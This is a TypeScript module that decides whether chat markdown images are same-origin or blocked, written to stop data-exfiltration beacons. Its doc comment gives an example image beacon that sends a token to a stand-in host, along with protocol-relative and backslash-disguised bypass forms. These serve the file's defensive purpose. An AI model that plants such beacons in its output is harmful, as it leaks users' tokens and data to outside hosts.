/**
 * Pure classification of a markdown image `src` against the chat renderer's
 * anti-exfil policy (message-scroll-perf ITEM-3 extracted this from the inline
 * `img` override so the security decision is unit-testable — DEC-3).
 *
 * - empty / non-string       → `empty`   (render nothing)
 * - same-origin (resolved)   → `allowed` (root-relative `/…`, bare relative, or
 *                                          a same-origin absolute URL)
 * - `data:` URI              → `blocked` (exfil vector / heavy inline payload)
 * - any other resolved origin → `blocked` (external, protocol-relative `//host`,
 *                                           backslash `/\host`, opaque `javascript:`)
 * - malformed URL             → `blocked`
 *
 * `blocked` src render a `BlockedImage` chip; `allowed` src render a
 * height-reserving `ReservedImage`. Blocking anything that resolves off-origin
 * prevents `<img src="https://exfil/?token=…">` (or its `//exfil` / `/\exfil`
 * disguises) beacons embedded in model/markdown output.
 *
 * IMPORTANT — the decision is made SOLELY by resolving the src against the page
 * origin and comparing origins. There is NO `startsWith('/')` fast-path: a naive
 * one lets a protocol-relative `//evil` OR a backslash-disguised `/\evil`
 * through (the WHATWG URL parser treats `\` as `/` under http, so both resolve
 * to an EXTERNAL authority). Resolving via `new URL(src, origin)` and checking
 * `u.origin === origin` closes that entire class. This TIGHTENS the original
 * inline logic, which used a bare `startsWith('/')` and did let those through.
 */
export type ImageSrcVerdict = 'empty' | 'allowed' | 'blocked'

export function classifyImageSrc(
  src: unknown,
  origin: string,
): ImageSrcVerdict {
  if (typeof src !== 'string' || src.length === 0) return 'empty'
  // data: is blocked outright (its resolved origin is opaque anyway; this is
  // belt-and-suspenders + intent-documenting).
  if (src.startsWith('data:')) return 'blocked'
  try {
    const u = new URL(src, origin)
    return u.origin === origin ? 'allowed' : 'blocked'
  } catch {
    return 'blocked'
  }
}
